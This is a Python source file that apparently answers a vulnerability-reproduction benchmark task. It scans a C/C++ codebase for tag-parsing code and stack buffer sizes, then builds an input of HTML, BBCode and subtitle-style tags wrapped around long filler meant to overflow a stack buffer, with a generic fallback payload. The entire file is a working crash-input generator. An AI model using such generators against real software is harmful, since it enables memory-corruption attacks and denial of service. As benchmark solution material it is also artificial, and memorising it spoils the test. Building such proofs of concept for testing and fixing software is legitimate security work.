import os
import re
import tarfile
import tempfile
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        try:
            root = self._extract(src_path)
        except Exception:
            # If extraction fails, fall back to default PoC
            return self._fallback_poc()

        # Analyze the codebase to tailor the PoC
        files = self._collect_code_files(root)
        try:
            analysis = self._analyze(files)
            poc = self._build_poc_from_analysis(analysis)
            if len(poc) < 64:  # Ensure we don't produce an empty or too short PoC
                return self._fallback_poc()
            return poc
        except Exception:
            return self._fallback_poc()

    def _extract(self, src_path: str) -> Path:
        # src_path can be a tarball or a directory
        src = Path(src_path)
        if src.is_dir():
            return src
        if not tarfile.is_tarfile(src_path):
            # Treat as directory even if not a tar
            return src

        tmpdir = tempfile.mkdtemp(prefix="poc_src_")
        with tarfile.open(src_path, "r:*") as tf:
            # Avoid path traversal vulnerabilities in tar extraction
            safe_members = []
            for m in tf.getmembers():
                mpath = Path(tmpdir) / m.name
                if not str(mpath.resolve()).startswith(str(Path(tmpdir).resolve())):
                    continue
                safe_members.append(m)
            tf.extractall(tmpdir, members=safe_members)
        return Path(tmpdir)

    def _collect_code_files(self, root: Path):
        exts = {".c", ".h", ".cpp", ".cc", ".cxx", ".hpp", ".hh"}
        files = []
        for p in root.rglob("*"):
            try:
                if p.is_file() and p.suffix.lower() in exts:
                    files.append(p)
            except Exception:
                pass
        return files

    def _read_text(self, p: Path) -> str:
        try_encodings = ["utf-8", "latin-1", "utf-8-sig", "cp1252"]
        for enc in try_encodings:
            try:
                return p.read_text(encoding=enc, errors="ignore")
            except Exception:
                continue
        return ""

    def _analyze(self, files):
        # Gather data about:
        # - presence of tag-like parsing
        # - typical stack buffer sizes
        # - literals that look like tags
        tag_style_counts = {"angle": 0, "square": 0, "curly": 0}
        candidate_tags = set()
        buffer_sizes = []

        # Regexes for analysis
        re_char_buf = re.compile(r"\bchar\s+([a-zA-Z_]\w*)\s*\[\s*(\d+)\s*\]")
        re_tag_word = re.compile(r"\btag\b", re.IGNORECASE)
        re_angle_check = re.compile(r"[=!\(\s]'<'|\<\s*[/]?\w+")
        re_square_check = re.compile(r"\[\s*[/]?\w+")
        re_curly_check = re.compile(r"\{\s*\\?\w+")
        re_string = re.compile(r"\"([^\"\\]*(?:\\.[^\"\\]*)*)\"")
        # Tag-like literal patterns
        re_tag_literal = re.compile(r"^<(?:/?)[A-Za-z][A-Za-z0-9:_-]*(?:\s[^<>]*)?>$")
        re_bbcode_literal = re.compile(r"^\[(?:/?)[A-Za-z][A-Za-z0-9:_-]*(?:=[^\]]*)?\]$")
        re_curly_literal = re.compile(r"^\{\\?[A-Za-z][A-Za-z0-9:_-]*.*\}$")

        for f in files:
            try:
                txt = self._read_text(f)
            except Exception:
                continue
            if not txt:
                continue

            # Count styles
            if re_angle_check.search(txt):
                tag_style_counts["angle"] += 1
            if re_square_check.search(txt):
                tag_style_counts["square"] += 1
            if re_curly_check.search(txt):
                tag_style_counts["curly"] += 1

            # Buffer sizes, prioritize files that mention "tag"
            tag_bias = 2 if re_tag_word.search(txt) else 1
            for m in re_char_buf.finditer(txt):
                try:
                    size = int(m.group(2))
                    # Ignore too small or too large (heap-like) sizes
                    if 8 <= size <= 65536:
                        for _ in range(tag_bias):
                            buffer_sizes.append(size)
                except Exception:
                    continue

            # Candidate tag literals
            for sm in re_string.finditer(txt):
                s = sm.group(1)
                # Quick unescape simple sequences
                s_un = s.replace(r"\\", "\\").replace(r"\"","\"")
                su = s_un.strip()
                if 2 <= len(su) <= 64:
                    if re_tag_literal.match(su):
                        candidate_tags.add(su)
                    elif re_bbcode_literal.match(su):
                        candidate_tags.add(su)
                    elif re_curly_literal.match(su):
                        candidate_tags.add(su)

        # Heuristic selections
        styles_sorted = sorted(tag_style_counts.items(), key=lambda x: (-x[1], x[0]))
        styles = [k for k, v in styles_sorted if v > 0]
        if not styles:
            styles = ["angle", "square", "curly"]

        # Buffer size estimation
        if buffer_sizes:
            # Use a high percentile to be safe
            buffer_sizes.sort()
            idx = int(len(buffer_sizes) * 0.8)
            est = buffer_sizes[min(max(idx, 0), len(buffer_sizes) - 1)]
            # Clamp to reasonable values
            est = max(128, min(8192, est))
        else:
            est = 1024

        # Select a few candidate tags of each style
        selected_candidates = self._select_candidate_tags(candidate_tags, styles)

        return {
            "styles": styles,
            "buffer_estimate": est,
            "candidates": selected_candidates
        }

    def _select_candidate_tags(self, candidate_tags, styles):
        angle = []
        square = []
        curly = []
        for t in candidate_tags:
            if t.startswith("<") and t.endswith(">"):
                angle.append(t)
            elif t.startswith("[") and t.endswith("]"):
                square.append(t)
            elif t.startswith("{") and t.endswith("}"):
                curly.append(t)

        # Fallback defaults per style
        defaults = {
            "angle": [
                "<b>", "</b>",
                "<i>", "</i>",
                "<font color=red>", "</font>",
                "<tag>", "</tag>",
                "<script>", "</script>",
                "<c1>", "</c1>"
            ],
            "square": [
                "[b]", "[/b]",
                "[i]", "[/i]",
                "[color=red]", "[/color]",
                "[url=http://example.com]", "[/url]"
            ],
            "curly": [
                "{\\b1}", "{\\b0}",
                "{\\i1}", "{\\i0}",
                "{color:red}", "{/color}",
                "{b}", "{/b}"
            ]
        }

        selected = []
        have = set()

        def add_pairs(lst):
            # Try to find reasonable opening/closing pairs in lst
            opens = {}
            for s in lst:
                k = None
                if s.startswith("</"):
                    k = s[2:-1]
                    if k in opens:
                        have.add(opens[k])
                        have.add(s)
                elif s.startswith("</") is False and s[1:2] != "/":
                    # Opening tag
                    # Extract the core token
                    core = s[1:-1].split()[0]
                    opens[core] = s

        if angle:
            add_pairs(angle)
        if square:
            add_pairs(square)
        if curly:
            add_pairs(curly)

        def ensure_style(style):
            nonlocal selected
            # Try to pick from 'have'
            added = 0
            if style == "angle":
                alist = [t for t in have if t.startswith("<")]
                # Ensure we have both open and close; if not, fall back
                if len(alist) >= 2:
                    selected.extend(alist[:2])
                    added = 2
                else:
                    selected.extend(defaults["angle"][:2])
                    added = 2
            elif style == "square":
                slist = [t for t in have if t.startswith("[")]
                if len(slist) >= 2:
                    selected.extend(slist[:2])
                    added = 2
                else:
                    selected.extend(defaults["square"][:2])
                    added = 2
            elif style == "curly":
                clist = [t for t in have if t.startswith("{")]
                if len(clist) >= 2:
                    selected.extend(clist[:2])
                    added = 2
                else:
                    selected.extend(defaults["curly"][:2])
                    added = 2
            return added

        for st in styles:
            ensure_style(st)

        # Deduplicate while preserving order
        seen = set()
        result = []
        for t in selected:
            if t not in seen:
                seen.add(t)
                result.append(t)
        if not result:
            # Very last fallback
            result = ["<b>", "</b>"]
        return result

    def _build_poc_from_analysis(self, analysis) -> bytes:
        styles = analysis.get("styles", [])
        est = analysis.get("buffer_estimate", 1024)
        candidates = analysis.get("candidates", [])

        # Construct a diversified PoC:
        # - Begin with multiple tag styles to ensure entering the vulnerable path
        # - Followed by large payload to overflow the stack buffer
        # - Interleave more tags to force repeated "tag found" handling
        # Estimate target payload length: exceed buffer significantly but keep moderate size
        target_len = max(1461, int(est * 1.6))
        target_len = min(target_len, 4096)

        # Build segments
        segments = []

        # Header: multiple recognized or default tags
        header_tags = []
        # Pair tags: candidates likely contains pairs or at least 2 tags of a style
        for i in range(0, len(candidates), 2):
            pair = candidates[i:i+2]
            if len(pair) == 2:
                header_tags.append(pair)
        if not header_tags:
            header_tags = [
                ("<b>", "</b>"),
                ("[b]", "[/b]"),
                ("{\\b1}", "{\\b0}")
            ]

        # Compose header with short filler to activate the "tag found" branch quickly
        short_fill = "X" * 64
        for open_tag, close_tag in header_tags[:5]:
            segments.append(open_tag)
            segments.append(short_fill)
            segments.append(close_tag)
            segments.append("\n")

        # Main overflow payload: long content gated by a tag
        # Prefer angle style first as it's most common
        preferred = None
        for a, b in header_tags:
            if a.startswith("<"):
                preferred = (a, b)
                break
        if preferred is None:
            preferred = header_tags[0]

        open_tag, close_tag = preferred
        # The content inside the tags
        # Use diverse characters to avoid early termination or special parsing quirks
        core_chunk = (
            "A" * 256 +
            "<inner>" + "B" * 128 + "</inner>" +
            "[inner]" + "C" * 128 + "[/inner]" +
            "{\\i1}" + "D" * 128 + "{\\i0}" +
            "E" * 256
        )
        # Repeat the chunk until we reach target length
        repeated = []
        total_len = sum(len(s) for s in segments) + len(open_tag) + len(close_tag)
        while total_len + len(core_chunk) < target_len:
            repeated.append(core_chunk)
            total_len += len(core_chunk)

        # If still short, pad slightly
        pad_needed = target_len - total_len
        if pad_needed > 0:
            repeated.append("F" * pad_needed)

        segments.append(open_tag)
        segments.append("".join(repeated))
        segments.append(close_tag)
        segments.append("\n")

        # Footer: more tags to ensure parser continues handling tags
        footer_tags = [
            ("<i>", "</i>"),
            ("[i]", "[/i]"),
            ("{\\color1}", "{\\color0}"),
            ("<font color=blue>", "</font>"),
        ]
        for ot, ct in footer_tags:
            segments.append(ot)
            segments.append("TAIL" * 16)
            segments.append(ct)
            segments.append("\n")

        poc_str = "".join(segments)

        # Ensure not extremely long; trim softly if exceeded
        if len(poc_str) > 8192:
            poc_str = poc_str[:8192]

        # Final safety: ensure no null bytes, keep as ASCII/UTF-8
        return poc_str.encode("utf-8", "ignore")

    def _fallback_poc(self) -> bytes:
        # Generic PoC with multiple tag formats and a long payload
        combos = [
            ("<b>", "</b>"),
            ("[b]", "[/b]"),
            ("{\\b1}", "{\\b0}"),
            ("<i>", "</i>"),
            ("[i]", "[/i]"),
            ("{\\i1}", "{\\i0}"),
            ("<font color=red>", "</font>"),
            ("[color=red]", "[/color]"),
            ("{color:red}", "{/color}"),
            ("<tag>", "</tag>"),
            ("<script>", "</script>")
        ]
        header = []
        for ot, ct in combos:
            header.append(ot)
            header.append("HDR" * 16)
            header.append(ct)
            header.append("\n")
        open_tag, close_tag = combos[0]
        payload = "A" * 600 + "<inner>" + "B" * 400 + "</inner>" + "[x]" + "C" * 300 + "[/x]" + "{\\i1}" + "D" * 300 + "{\\i0}" + "E" * 600
        main = open_tag + payload + close_tag + "\n"
        tail = []
        for ot, ct in combos[3:6]:
            tail.append(ot)
            tail.append("TAIL" * 32)
            tail.append(ct)
            tail.append("\n")
        poc = "".join(header) + main + "".join(tail)
        # Aim around ~2000 bytes
        if len(poc) < 1800:
            poc += "P" * (1800 - len(poc))
        elif len(poc) > 4096:
            poc = poc[:4096]
        return poc.encode("utf-8", "ignore")
